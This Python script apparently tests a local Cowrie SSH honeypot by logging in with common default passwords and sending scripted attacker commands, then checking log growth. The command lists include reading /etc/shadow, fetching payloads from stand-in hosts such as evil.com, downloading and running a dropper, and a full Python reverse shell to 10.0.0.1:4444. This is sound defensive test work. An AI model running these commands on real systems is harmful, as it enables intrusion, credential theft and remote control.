"""Generate realistic attack data for testing the honeypot."""

import paramiko
import threading
import time
import random
from pathlib import Path

ATTACKERS = [
    {
        "name": "botnet-1",
        "ip": None,  # will use localhost
        "username": "root",
        "password": "123456",
        "commands": [
            "whoami",
            "uname -a",
            "cat /etc/shadow",
            "wget http://malware.example.com/bot.sh",
        ],
    },
    {
        "name": "scanner-1",
        "username": "admin",
        "password": "admin123",
        "commands": [
            "id",
            "ps aux",
            "netstat -tlnp",
            "curl http://evil.com/backdoor",
        ],
    },
    {
        "name": "bruteforce-1",
        "username": "ubuntu",
        "password": "password123",
        "commands": [
            "ls -la /root",
            "cat /etc/passwd",
            "cat /etc/ssh/sshd_config",
            "ls -la /etc/",
        ],
    },
    {
        "name": "script-kiddie",
        "username": "pi",
        "password": "raspberry",
        "commands": [
            "sudo apt-get update",
            "apt-get install nmap -y",
            "nmap -sS localhost",
            "nmap -sV -p 22,80,443 192.168.1.0/24",
        ],
    },
    {
        "name": "apt-attacker",
        "username": "root",
        "password": "toor",
        "commands": [
            "cd /tmp",
            "curl -s http://malicious.site/dropper.sh -o /tmp/dropper.sh",
            "chmod +x /tmp/dropper.sh",
            "bash /tmp/dropper.sh",
            "nohup python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' &",
        ],
    },
]


def simulate_attack(attacker: dict):
    name = attacker["name"]
    user = attacker["username"]
    pwd = attacker["password"]
    cmds = attacker["commands"]

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            "127.0.0.1",
            port=2222,
            username=user,
            password=pwd,
            look_for_keys=False,
            allow_agent=False,
            timeout=10,
        )

        chan = client.invoke_shell()
        time.sleep(0.3)

        for cmd in cmds:
            chan.send(cmd + "\n")
            time.sleep(random.uniform(0.2, 0.5))

        time.sleep(0.5)
        chan.send("exit\n")
        time.sleep(0.3)
        client.close()
        status = "OK"
    except Exception as e:
        status = f"FAIL: {e}"

    print(f"  [{status}] {name} ({user}:{pwd}) - {len(cmds)} commands")


def main():
    log_path = Path(
        "C:/Users/kanth/honeypot-project/docker/cowrie/var/log/cowrie/cowrie.json"
    )
    initial_size = log_path.stat().st_size if log_path.exists() else 0

    print(f"[*] Initial log size: {initial_size} bytes")
    print(f"[*] Simulating {len(ATTACKERS)} attackers...\n")

    threads = []
    for attacker in ATTACKERS:
        t = threading.Thread(target=simulate_attack, args=(attacker,))
        threads.append(t)
        t.start()
        time.sleep(random.uniform(1.0, 2.0))

    for t in threads:
        t.join()

    final_size = log_path.stat().st_size if log_path.exists() else 0
    print(f"\n[*] Final log size: {final_size} bytes")
    print(f"[*] New log data: {final_size - initial_size} bytes")
    print("[*] Done!")


if __name__ == "__main__":
    main()
